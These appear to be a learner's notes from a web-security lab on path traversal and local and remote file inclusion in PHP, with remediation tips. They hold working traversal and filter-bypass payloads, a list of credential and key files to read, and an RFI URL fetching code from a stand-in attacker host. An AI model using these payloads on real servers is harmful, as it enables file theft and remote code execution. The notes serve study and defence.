In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. 
- Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. The following diagram breaks down the essential parts of a URL.
![[Pasted image 20240601141418.png]]
![[Pasted image 20240601141453.png]]

**Why do File inclusion vulnerabilities happen?**
File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.

## ==Path Traversal==
Also known as Directory traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.

Path traversal vulnerabilities occur when the user's input is passed to a function such as `file_get_contents` in PHP. It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the `file_get_contents` to read the content of a file. You can find more information about the function [here](https://www.php.net/manual/en/function.file-get-contents.php).

The following graph shows how a web application stores files in `/var/www/app`. The happy path would be the user requesting the contents of **userCV.pdf** from a defined path `/var/www/app/CVs.`

![[Pasted image 20240601141926.png]]

We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the **dot-dot-slash attack**, take advantage of moving the directory one step up using the double dots ../. If the attacker finds the entry point, which in this case `get.php?file=`, then the attacker may send something as follows: `http://webapp.thm/get.php?file=../../../../etc/passwd`

![[Pasted image 20240601142148.png]]

Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in `c:\boot.ini`, then the attacker can try the following depending on the target OS version:

`http://webapp.thm/get.php?file=../../../../boot.ini` or 
`http://webapp.thm/get.php?file=../../../../windows/win.ini`

| **Location**                | **Description**                                                                                                                                                   |
| --------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /etc/issue                  | contains a message or system identification to be printed before the login prompt.                                                                                |
| /etc/profile                | controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived |
| /proc/version               | specifies the version of the Linux kernel                                                                                                                         |
| /etc/passwd                 | has all registered user that has access to a system                                                                                                               |
| /etc/shadow                 | contains information about the system's users' passwords                                                                                                          |
| /root/.bash_history         | contains the history commands for root user                                                                                                                       |
| /var/log/dmessage           | contains global system messages, including the messages that are logged during system startup                                                                     |
| /var/mail/root              | all emails for root user                                                                                                                                          |
| /root/.ssh/id_rsa           | Private SSH keys for a root or any known valid user on the server                                                                                                 |
| /var/log/apache2/access.log | the accessed requests for Apache  webserver                                                                                                                       |
| C:\boot.ini                 | contains the boot options for computers with BIOS firmware                                                                                                        |

### ==Local File Inclusion (﻿LFI) #1==

LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as `include`, `require`, `include_once`, and `require_once` often contribute to vulnerable web applications.

```php
<?PHP 
	include($_GET["lang"]);
?>
```

The PHP code above uses a `GET` request via the URL parameter `lang` to include the file of the page. The call can be done by sending the following HTTP request as follows: `http://webapp.thm/index.php?lang=EN.php` to load the English page or `http://webapp.thm/index.php?lang=AR.php` to load the Arabic page, where `EN.php` and `AR.php` files exist in the same directory.

Let's say we want to read the `/etc/passwd` file, which contains sensitive information about the users of the Linux operating system, we can try the following:
`http://webapp.thm/get.php?file=/etc/passwd` 

In this case, it works because there isn't a directory specified in the `include` function and no input validation.

```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via `lang` parameters.  If there is no input validation, the attacker can manipulate the URL by replacing the `lang` input with other OS-sensitive files such as `/etc/passwd`.

Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit: `http://webapp.thm/index.php?lang=../../../../etc/passwd`

Sometimes we need to do that by requesting a `POST` method to the server using `curl`:
![[Pasted image 20240602050101.png]]
![[Pasted image 20240602051034.png]]

We can also use `cookies` and forward requests via Burp:
![[Pasted image 20240602052925.png]]
## ==Local File Inclusion (﻿LFI) #2==

In this scenario, we have the following entry point: `http://webapp.thm/index.php?lang=EN`. 

If we enter an invalid input, such as THM, we get the following error:
```php
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

The error message discloses significant information:
- the include function looks like:  `include(languages/THM.php);`. If you look at the directory closely, we can tell the function includes files in the languages directory is adding  `.php` at the end of the entry. To bypass this scenario, we can use the NULL BYTE, which is `%00`.
- the full web application directory path which is `/var/www/html/THM-4/`. To exploit this, we need to use the `../` trick, to get out the current folder. 

in the following scenarios, the developer starts to use input validation by filtering some keywords. When we try `http://webapp.thm/index.php?lang=../../../../etc/passwd%00` , we got the following error: 
```php
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```
If we check the warning message in the `include(languages/etc/passwd)` section, we know that the web application replaces the `../` with the empty string. There are a couple of techniques we can use to bypass this.

First, we can send the following payload to bypass it: `....//....//....//....//....//etc/passwd`
![[Pasted image 20240602043555.png]]

## ==Remote File Inclusion - RFI==

Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. 

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:
- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)

 Let's say that the attacker hosts a PHP file on their own server `http://attacker.thm/cmd.txt where cmd.txt` contains an execution (reverse shell).
```php
<?PHP print exec('hostname'); ?>
```

First, the attacker injects the malicious URL, which points to the attacker's server, such as `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt.` If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a `GET` request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker.
![[Pasted image 20240602044852.png]]
```
http://10.10.178.13/playground.php?file=http://10.10.190.121:8000/cmd.txt
```
## Remediation

As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:

1. Keep system and services, including web application frameworks, updated with the latest version.  
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as `allow_url_fopen` on and `allow_url_include`.  
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.  
7. Implement whitelisting for file names and locations as well as blacklisting.